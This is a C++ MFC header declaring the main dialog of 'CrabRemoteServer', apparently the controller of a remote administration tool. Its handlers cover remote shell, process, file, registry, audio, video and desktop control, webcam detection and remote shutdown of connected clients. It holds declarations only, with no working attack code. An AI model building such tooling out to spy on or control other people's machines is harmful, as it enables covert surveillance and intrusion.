
// CrabRemoteServerDlg.h: 头文件
//

#pragma once
#include"TrueColorToolBar.h"
#include"ConfigFile.h"
#include"CServerManagerDlg.h"
#include"IocpServer.h"
#include"Common.h"
#include"Login.h"
#include"InstantMessageDlg.h"
#include"ProcessManagerDlg.h"
#include"ProcessVMMapDlg.h"
#include"CmdManagerDlg.h"
#include"WindowManager.h"
#include"RemoteController.h"
// CCrabRemoteServerDlg 对话框
class CCrabRemoteServerDlg : public CDialogEx
{
// 构造
public:
	CCrabRemoteServerDlg(CWnd* pParent = nullptr);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_CRABREMOTESERVER_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	CListCtrl m_ClientInfoList;
	CListCtrl m_ServerInfoList;
	CTrueColorToolBar m_TrueColorToolBar;	//控件变量的声明
	NOTIFYICONDATA      m_NotifyIconData;	//托盘成员
	ConfigFile  m_configFile;
	CStatusBar          m_StatusBar;        //关联控件 构造函数 与 DoDataExchange

	int m_listenPort;
	int m_maxConnections;

	CIocpServer* m_IocpServer;

	ULONG m_ConnectionCount = 0;

public:
	//初始化表格 
	void initListCtrl();
	
	//展示时间
	afx_msg void OnTimer(UINT_PTR nIDEvent);
	void getLocalTime();

	void intiSolidMenu();	//初始化菜单
	afx_msg void OnMenuSetLocal();
	afx_msg void OnMenuAddInformation();
	afx_msg void OnMenuExit();
	afx_msg void OnClose();

	//初始化真彩工具棒
	void TrueColorToolBarInit();

	//真彩棒的消息关联函数
	afx_msg VOID OnButtonCmdManager();
	afx_msg VOID OnButtonProcessManager();
	afx_msg VOID OnButtonWindowManager();
	afx_msg VOID OnButtonRemoteControl();
	afx_msg VOID OnButtonFileManager();
	afx_msg VOID OnButtonAudioManager();
	afx_msg VOID OnButtonCleanManager();
	afx_msg VOID OnButtonVideoManager();
	afx_msg VOID OnButtonServiceManager();
	afx_msg VOID OnButtonRegisterManager();
	afx_msg VOID OnButtonServerManager();
	afx_msg VOID OnButtonClientManager();
	afx_msg VOID OnButtonServerAbout();

	//初始化托盘
	void NotifyIconDataInit();
	//托盘的消息处理函数
	afx_msg void OnNotifyIconData(WPARAM wParam, LPARAM lParam);
	afx_msg void OnShowMainDialog();
	afx_msg void OnHideMainDialog();

	//将ini文件数据放入ServerlistCtrl中
	void ShowMainDlgInfo(BOOL ok, CString& message);

	void ServerStart();

	static VOID CALLBACK WndCallback(PCONTEXT_OBJECT ContextObject);   //窗口回调
	static VOID WndHandleIo(CONTEXT_OBJECT* ContextObject);   //进行数据分析
	LRESULT OnClientLogin(WPARAM wParam, LPARAM lParam);
	VOID CCrabRemoteServerDlg::AddClientInfo(CString ClientAddress, CString ClientPosition,
		CString HostName,
		CString OsName, CString ProcessorNameString, CString IsWebCameraExist,
		CString WebSpeed, CONTEXT_OBJECT* ContextObject);

	VOID StatusBarInit();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnNMRClickClientInformationList(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnDeleteConnection();
	afx_msg void OnInstantMessage();
	afx_msg void OnRemoteShutdown();
	VOID SendingSelectedCommand(PBYTE BufferData, ULONG BufferLength);
	afx_msg LRESULT OnOpenInstantMessageDialog(WPARAM ParameterData1, LPARAM ParameterData2);
	afx_msg LRESULT OnOpenCmdManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2);
	afx_msg LRESULT OnOpenProcessManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2);
	LRESULT OnOpenWindowManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2);
	afx_msg LRESULT OnOpenRemoteControllerDialog(WPARAM ParameterData1, LPARAM ParameterData2);

};
